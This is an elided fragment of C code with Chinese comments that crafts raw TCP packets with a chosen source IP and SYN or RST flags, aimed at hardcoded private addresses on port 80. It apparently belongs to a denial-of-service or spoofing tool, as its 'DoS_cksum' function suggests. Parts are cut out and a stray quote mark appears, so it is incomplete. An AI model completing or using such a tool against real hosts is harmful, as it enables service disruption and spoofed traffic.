...
#include <sys/types.h>
#include <unistd.h>
#define source_port 10010

unsigned short DoS_cksum(unsigned short *ptr, int nbytes);
int senddata(int syn,int rst,char src_ip[],char dst_ip[],char port[]);
...
//	inet_aton(argv[1], &pesudo.sin_addr);
//	inet_aton(argv[2], &target.sin_addr);
//	target.sin_port = htons(atoi("80"));
    senddata(1,0,"10.100.50.104","10.100.59.110","80");
	// senddata(0,1,0);"
}

int senddata(int syn,int rst,char *src_ip,char *dst_ip,char *port) {
    inet_aton(src_ip, &pesudo.sin_addr);
    inet_aton(dst_ip, &target.sin_addr);
    target.sin_port = htons(atoi(port));
	packet_data packet;
	pseudo_heard pseudo_h;
	bzero(&packet, sizeof(packet)); //清空垃圾值
	...
	packet.tcp.source = htons(source_port); /*源端口号*/
	...
	packet.tcp.rst = rst; /* Reset 标志 */
	packet.tcp.syn = syn; /* 同步序号标志 */
